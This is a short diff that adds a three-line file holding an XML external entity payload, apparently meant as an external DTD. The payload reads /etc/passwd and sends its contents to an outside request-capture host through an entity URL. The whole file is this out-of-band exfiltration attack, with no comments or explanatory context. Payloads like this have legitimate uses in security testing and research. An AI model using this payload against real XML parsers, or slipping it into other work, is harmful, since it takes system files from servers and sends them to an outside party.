@@ -1,0 +1,3 @@
+<!ENTITY % file SYSTEM "/etc/passwd">
+<!ENTITY % all "<!ENTITY send SYSTEM 'https://requestb.in/1emoed31?%file;'>">
+%all;
